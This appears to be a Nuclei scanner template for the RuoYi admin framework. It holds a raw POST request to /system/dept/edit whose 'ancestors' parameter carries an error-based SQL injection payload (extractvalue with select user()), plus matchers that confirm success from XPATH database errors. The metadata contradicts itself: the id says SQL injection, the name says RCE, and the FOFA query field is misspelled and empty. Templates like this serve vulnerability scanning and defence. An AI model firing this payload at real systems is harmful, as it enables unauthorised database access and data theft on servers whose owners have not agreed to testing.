id: ruoyi-list-sqli
info:
  name: ruoyi-getNames-rce
  author: ro1t
  severity: high
  metadata:
    fofa-qeury: app=""
  tags: ruoyi

http:
  - raw:
      - |
        POST /system/dept/edit HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 231
        sec-ch-ua: "Not(A:Brand";v="24", "Chromium";v="122"
        Accept: application/json, text/javascript, */*; q=0.01
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        X-Requested-With: XMLHttpRequest
        sec-ch-ua-mobile: ?0
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
        sec-ch-ua-platform: "Windows"
        Sec-Fetch-Site: same-origin
        Sec-Fetch-Mode: cors
        Sec-Fetch-Dest: empty
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: JSESSIONID=6d01744f-6049-4e6f-95bc-f75fe586f8fb; 
        Connection: close

        deptId=100&parentId=0&parentName=%E6%97%A0&deptName=%E8%8B%A5%E4%BE%9D%E7%A7%91%E6%8A%801&orderNum=0&leader=%E8%8B%A5%E4%BE%9D&phone=15888888888&email=ry%40qq.com&status=0&ancestors=0)or(extractvalue(1,concat(0,(select+user()))));#
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Error updating database"
          - "XPATH"

